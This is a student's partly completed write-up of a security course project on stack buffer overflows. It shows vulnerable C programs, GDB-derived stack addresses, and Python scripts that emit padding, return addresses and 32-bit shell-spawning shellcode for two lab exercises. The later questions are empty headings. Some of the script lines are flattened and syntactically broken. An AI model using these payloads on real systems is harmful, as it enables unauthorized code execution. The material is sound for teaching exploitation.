# Preliminaries
## Attack Workflow
> [!important]
> The output of `egg` is forwarded to the input file, so `print` statements in `egg` will be written to the file.

 
## Login
> [!important]
> `ssh -p 16122 username@127.0.0.1`



## GDB Layout
> [!important]
> We first run `gdb`, then choose one of the following options(src is the most used one):
> ![](Project_1.assets/image-20240301204358717.png)




# Q1 Buffer Overflow Attack I - Easy
> [!note]
> username: `remus`
> password: `ilearned`


## Vulnerable Code
> [!code]
```c
#include <stdio.h>

void orbit(void) {
    char buf[8];
    gets(buf);  // Vulnerable
}

int main(void) {
    orbit();
    return 0;
}

```



## Main Idea
> [!note]
> The code is vulnerable because `gets(buf)` does not check the length of the input from the user, which lets an attacker write past the end of the buffer. So we could use buffer overflow attack scheme. 
> 
> Since the shellcode is long(more than 16 bytes), and the buffer is defaulted to be 16 bytes, so we can just put the shellcode starting from the address of the buffer. Instead, we put the shellcode at the stack frame of `orbit()`'s caller and overwrite the `RIP` of `orbit()` with the address of the `SHELLCODE`. 



## Magic Numbers
> [!note]
> First, we print out nothing from the `egg` file(no input to `orbit` program). We get the following:
> ![](Project_1.assets/image-20240226143209029.png)
> By doing this, we know:
> - The location of the `sfp`(at address `0xffffd808`)and `rip`(which is at address `0xffffd80c`, which we want to overwrite)
> - The starting address of the `buf`, which is at address `0xffffd7f8`, 16 bytes below the `sfp`.


## Exploit Structure
> [!note]
> Here is the stack diagram:
> ![](Project_1.assets/image-20240226143951198.png)
> The explit has three parts:
> 1. Writing 20 bytes of padding characters to overwrite the `buf` and `sfp`.
> 2. Overwrite the `rip` with the starting address of the `SHELLCODE`, which is `0xffffd80c+0x04=0xffffd810`
> 3. Finally, insert the shellcode directly after the `rip`.
> 
> This cause the `orbit` function to start executing the `SHELLCODE` at address `0xffffd810` when it returns.



## Exploit GDB Output
> [!note]
> When we ran GDB after inputting the malicious exploit string, we got the following output:
> ![](Project_1.assets/image-20240226144812787.png)
> After 20 bytes of garbage (`\x97`), the rip is overwritten with `0xffffd810`, which points to the shellcode directly after the rip.



## Solution of Egg
> [!code]
> The final content of `egg` file could be:
```python
#!/usr/bin/env python3 import sys 
# Configure Python to print text strings like byte strings sys.stdout.reconfigure(encoding='latin1') 

SHELLCODE = \ '\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97' \ '\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97\x97' \ '\x10\xd8\xff\xff' \ '\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a' \ '\x47\x58\xcd\x80\x31\xc0\x50\x68\x2d\x69' \ '\x69\x69\x89\xe2\x50\x68\x2b\x6d\x6d\x6d' \ '\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f' \ '\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x89' \ '\xe1\x31\xd2\xb0\x0b\xcd\x80' 

print(SHELLCODE)
```




# Q2 Buffer Overflow Attack II - Easy
> [!overview]
> ![](Project_1.assets/image-20240226145038735.png)



## Vulnerable Code
> [!code]
> `telemetry` is the vulnerable C program in this question. It takes a file and prints out its contents, but it expects the file to be specially formatted: The first byte of the file specifies its length, followed by the actual file.
> 
> The program also implements a check to make sure the buffer isn’t too large.
> ![](Project_1.assets/image-20240226152125664.png)
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>

void display(const char *path) {
    char msg[128]; // Vulnerable buffer
    int8_t size;
    FILE *file;
    size_t bytes_read;

    memset(msg, 0, 128);

    file = fopen(path, "r");
    if (!file) {
        perror("fopen");
        return;
    }
	// Read a number from the file at `path`
    bytes_read = fread(&size, 1, 1, file);
    if (bytes_read == 0 || size > 128) {
        return;
	}

    // Read `size` number of one-byte from the file at `path`
    bytes_read = fread(msg, 1, size, file);

	// Print the string to the standard output. Append a `\n` at the end.
    puts(msg);
}


int main(int argc, char **argv)
{
    if (argc != 2) {
        return 1;
    }

    display(argv[1]);
    return 0;
}

```




## Main Idea
> [!note]
> First, we print out nothing from the `egg` file(no input to `orbit` program). We get the following:
> ![](Project_1.assets/image-20240226151440914.png)![](Project_1.assets/image-20240226151455050.png)
> By doing this, we know:
> - The location of the `sfp`(at address `0xffffd7b8`)and `rip`(which is at address `0xffffd7bc`, which we want to overwrite)
> - The starting address of the `msg`, which is at address `0xffffd728`, 144 bytes below the `sfp`.
> - The file that the program read the data from is called `navigation`，but we don't have it, so we have to create this.
> ![](Project_1.assets/image-20240226151714303.png)
> 
> The key vulerabilities of this piece of code are related to implicit type casting:
> ![](Project_1.assets/image-20240301205423499.png)
> 1. At line 20, `size > 128` can be circumvented if `size < 0`.
> 2. At line 25, the third argument of `fread()` is `size_t`, so if we pass in `size < 0` it will be implicitly converted to `unsigned int`, which means the maximum number of bytes that can be read from the file is 255 bytes instead of 127 bytes, which could be where we start our attack.
> 




## Magic Numbers
> [!code]
> ![](Project_1.assets/image-20240301213551771.png)
> We find that saved ebp is 144 bytes above the `msg`.







## Exploit Structure
> [!code]
> ![](Project_1.assets/image-20240301212602034.png)
> We need to overwrite `144 + 4 = 148` bytes(**buffer until eip**) with padding, and 4 bytes that has memory address of our shellcode. In detail, we should have the following content in the `navigation` file:
> 1. A one-byte int, we choose it to be `148 + 4 + 57 + 1 = 210`(0x11010010), which means we need in total read 210 bytes from the file to the msg buffer. But actually any number greater than 210 and less equal to 255 would work.
> 1. `148` is the padding to the buffer and saved ebp. We choose padding to be `\x97`.
> 2. `4` bytes of the address of the shell code. `4` is the 4-byte address of our shell code which is `\xc0\xd7\xff\xff`.
> 3. `57` is the width of the shell code. 
> 4. `1` is the `\0` at the end to prevent segment fault.



## Exploit GDB Output
> [!code]
> ![](Project_1.assets/image-20240301214218316.png)


## Solution Egg
> [!code]
```python
#!/usr/bin/env python3 import sys 
# Configure Python to print text strings like byte strings. Don't remove this! 

sys.stdout.reconfigure(encoding='latin1') 

SHELLCODE = \ '\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a' \ '\x47\x58\xcd\x80\x31\xc0\x50\x68\x2d\x69' \ '\x69\x69\x89\xe2\x50\x68\x2b\x6d\x6d\x6d' \ '\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f' \ '\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x89' \ '\xe1\x31\xd2\xb0\x0b\xcd\x80' 

### YOUR CODE HERE ### print('\xd2'+'\x97'*148+'\xc0\xd7\xff\xff'+SHELLCODE+'\0')
```




# Q3 Stack Canary - Medium
> [!overview]
> `username`: polaris
> `password`: tolearn
> 
> For this question, **stack canaries are enabled**. You need to make sure the value of the canary isn’t changed when the function returns, but you still need to overwrite the RIP.


## Vulnerable Code
> [!code]






## Main Idea
> [!code]





## Magic Numbers
> [!code]





## Exploit Structure
> [!code]

## Exploit GDB Output
> [!code]

## Solution Interact
> [!code]


# Q4 Off-by-one Attack

## Vulnerable Code


## Main Idea

## Magic Numbers


## Exploit Structure


## Exploit GDB Output


# Q5
## Vulnerable Code


## Main Idea

## Magic Numbers


## Exploit Structure


## Exploit GDB Output



# Q6 Format String 
## Vulnerable Code


## Main Idea

## Magic Numbers


## Exploit Structure


## Exploit GDB Output



# Q7 Stack Canary and ASLR
## Vulnerable Code


## Main Idea

## Magic Numbers


## Exploit Structure


## Exploit GDB Output